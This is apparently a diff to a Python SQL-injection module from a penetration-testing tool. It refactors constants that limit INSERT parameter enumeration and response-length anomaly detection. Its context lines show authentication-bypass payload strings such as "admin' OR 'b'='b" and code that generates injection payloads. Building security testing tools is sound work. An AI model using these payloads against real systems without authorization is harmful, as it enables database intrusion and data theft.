@@ -17,6 +17,10 @@ class SQLInjectionModule(InjectionAttackModule):
     Detects and exploits SQL injection vulnerabilities using the 6-step methodology.
     """
     
+    # Configuration constants for INSERT parameter enumeration
+    MAX_STRING_ENUM_PARAMS = 5  # Maximum parameters for string enumeration (to limit payload count)
+    SIGNIFICANT_CONTENT_LENGTH_DIFF = 50  # Threshold for significant content length change (bytes)
+    
     def get_context_type(self) -> InjectionContextType:
         return InjectionContextType.SQL
     
@@ -40,6 +44,8 @@ class SQLInjectionModule(InjectionAttackModule):
             "') OR ('x')=('x",
             
             # Quote balancing payloads (avoid SQL comments)
+            # Note: Some payloads include comments for comparison/fallback, but
+            # the primary quote-balanced variants are comment-free
             "Wiley' OR 'a'='a",
             "admin' OR 'b'='b",
             "' OR '1'='1' OR 'a'='a",
@@ -210,7 +216,8 @@ class SQLInjectionModule(InjectionAttackModule):
             payloads.append(f"{base_value}', {params})--")
             
         # Parameter enumeration with string values
-        for i in range(1, min(6, max_params + 1)):  # Limit to 5 for string enum
+        # Use class constant to limit string enumeration (reduces payload count)
+        for i in range(1, min(self.MAX_STRING_ENUM_PARAMS + 1, max_params + 1)):
             params = ', '.join([f"'val{j}'" for j in range(i)])
             payloads.append(f"{base_value}', {params})--")
             
@@ -388,7 +395,7 @@ class SQLInjectionModule(InjectionAttackModule):
         if baseline_response:
             baseline_body, _ = baseline_response
             len_diff = abs(len(response_body) - len(baseline_body))
-            if len_diff > 50:  # Significant difference
+            if len_diff > self.SIGNIFICANT_CONTENT_LENGTH_DIFF:
                 anomalies.append(f"content_change: Length difference of {len_diff} bytes")
         
         return len(anomalies) > 0, anomalies
